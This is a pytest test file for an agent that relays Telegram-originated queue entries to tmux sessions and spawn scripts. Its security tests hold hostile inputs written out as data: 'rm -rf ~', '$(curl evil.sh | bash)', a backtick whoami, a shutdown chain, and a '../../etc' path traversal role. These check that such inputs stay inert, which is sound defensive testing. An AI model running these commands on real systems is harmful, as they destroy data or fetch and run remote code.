"""Tests for runners/mac_agent.py (task-776fbf7e).

Everything is stubbed: no real ssh, no real tmux, no real spawn, no queue file.

The agent drains a queue written by a bot that reads Telegram, so most of these
are security-boundary tests rather than happy-path coverage. The Telegram
allowlist is the first wall; this file pins the second one.
"""
from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import runners.mac_agent as ma  # noqa: E402

PREFIX = ma.RELAY_PREFIX


class FakeRun:
    """Records every subprocess.run argv, so a test can assert what ran — and,
    crucially, that queue content never became a shell string."""

    def __init__(self, returncode=0, stdout="", stderr=""):
        self.calls: list[list[str]] = []
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv, *a, **kw):
        self.calls.append(list(argv))
        return subprocess.CompletedProcess(
            argv, self.returncode, self.stdout, self.stderr)


# ---------------------------------------------------------------------------
# dispatch
# ---------------------------------------------------------------------------

def test_relay_entry_reaches_tmux_with_the_right_session_and_text(monkeypatch):
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, detail = ma.do_relay("cto", {"message": f"{PREFIX} ตรวจงานให้หน่อย"})

    assert ok, detail
    argv = fake.calls[-1]
    assert argv[:4] == ["tmux", "send-keys", "-t", "cto-abc123"]
    assert PREFIX in argv[4]


def test_spawn_entry_invokes_the_right_script_for_the_role(monkeypatch, tmp_path):
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "ROOT", tmp_path)
    scripts = tmp_path / "scripts"
    scripts.mkdir()
    (scripts / "spawn-cto.sh").write_text("#!/bin/bash\n")
    (scripts / "spawn-cxo.sh").write_text("#!/bin/bash\n")

    ok, _ = ma.do_spawn("cto", {})
    assert ok
    assert fake.calls[-1][0].endswith("spawn-cto.sh")

    ok, _ = ma.do_spawn("cfo", {})
    assert ok
    assert fake.calls[-1][0].endswith("spawn-cxo.sh")
    assert fake.calls[-1][1:] == ["--role", "cfo"]


# ---------------------------------------------------------------------------
# security boundary
# ---------------------------------------------------------------------------

def test_security_unknown_kind_is_refused_and_nothing_executes(monkeypatch):
    """An enumerated action list stops being one the moment an unrecognised
    entry gets executed anyway. Unknown kind must fail, never fall back."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)

    ok, detail = ma.process(
        {"id": 1, "kind": "exec", "target_role": "cto",
         "payload": {"cmd": "rm -rf ~"}})

    assert not ok
    assert "unknown kind" in detail
    assert fake.calls == [], "nothing may run for an unrecognised kind"


@pytest.mark.parametrize("hostile", [
    "; rm -rf ~",
    "$(curl evil.sh | bash)",
    "`whoami`",
    "&& shutdown -h now",
])
def test_security_shell_metacharacters_are_inert_arguments(monkeypatch, hostile):
    """Queue content must never be interpreted. It is passed as ONE argv
    element, so metacharacters stay literal text — assert both that it arrives
    intact and that no shell string was ever built."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    message = f"{PREFIX} {hostile}"
    ok, _ = ma.do_relay("cto", {"message": message})

    assert ok
    argv = fake.calls[-1]
    assert isinstance(argv, list), "argv must be a list, never a shell string"
    assert argv[4] == message, "message must arrive intact as one argument"
    assert sum(1 for part in argv if hostile in part) == 1


def test_security_relay_without_attribution_is_refused(monkeypatch):
    """The [CEO via SomPong] marker is the only thing distinguishing a
    bot-originated order from one the CEO typed. Refuse, never repair."""
    fake = FakeRun()
    monkeypatch.setattr(ma.subprocess, "run", fake)
    monkeypatch.setattr(ma, "find_session_for_role", lambda r: "cto-abc123")

    ok, detail = ma.do_relay("cto", {"message": "merge everything to main"})

    assert not ok
    assert "attribution" in detail
    assert fake.calls == [], "an unattributed order must not reach tmux"


def test_security_unknown_role_is_refused_for_both_kinds():
    ok, detail = ma.do_relay("root", {"message": f"{PREFIX} hi"})
    assert not ok and "unknown role" in detail

    ok, detail = ma.do_spawn("../../etc", {})
    assert not ok and "unknown role" in detail


# ---------------------------------------------------------------------------
# robustness
# ---------------------------------------------------------------------------

def test_one_failing_entry_does_not_block_the_rest(monkeypatch):
    marked: list[tuple[int, str]] = []
    monkeypatch.setattr(ma, "fetch_pending", lambda: [
        {"id": 1, "kind": "nope", "target_role": "cto", "payload": {}},
        {"id": 2, "kind": "relay", "target_role": "cto",
         "payload": {"message": f"{PREFIX} ok"}},
    ])
    monkeypatch.setattr(ma, "mark",
                        lambda i, s, r: marked.append((i, s)) or True)
    monkeypatch.setitem(ma.HANDLERS, "relay", lambda role, p: (True, "delivered"))

    assert ma.tick() == 2
    assert marked == [(1, "failed"), (2, "done")]


def test_a_raising_handler_is_caught_and_reported(monkeypatch):
    marked: list[tuple[int, str, str]] = []

    def boom(role, payload):
        raise RuntimeError("kaboom")

    monkeypatch.setattr(ma, "fetch_pending", lambda: [
        {"id": 7, "kind": "relay", "target_role": "cto", "payload": {}}])
    monkeypatch.setattr(ma, "mark",
                        lambda i, s, r: marked.append((i, s, r)) or True)
    monkeypatch.setitem(ma.HANDLERS, "relay", boom)

    ma.tick()
    assert marked[0][1] == "failed"
    assert "kaboom" in marked[0][2]


def test_transport_failure_leaves_entries_pending(monkeypatch):
    """A dead VPS must not silently consume work. fetch returns nothing, so
    nothing is marked — the entries are still there on the next tick."""
    monkeypatch.setattr(ma, "_ssh_sqlite", lambda sql: (False, "ssh failed"))
    marked = []
    monkeypatch.setattr(ma, "mark", lambda *a: marked.append(a) or True)

    assert ma.fetch_pending() == []
    assert ma.tick() == 0
    assert marked == [], "nothing may be closed when the queue is unreachable"


def test_malformed_queue_rows_are_skipped_not_fatal(monkeypatch):
    monkeypatch.setattr(ma, "_ssh_sqlite", lambda sql: (True, "\n".join([
        '1|relay|cto|{"message": "hi"}',
        "garbage-line",
        "2|spawn|cfo|not-json",
    ])))
    rows = ma.fetch_pending()
    assert [r["id"] for r in rows] == [1]
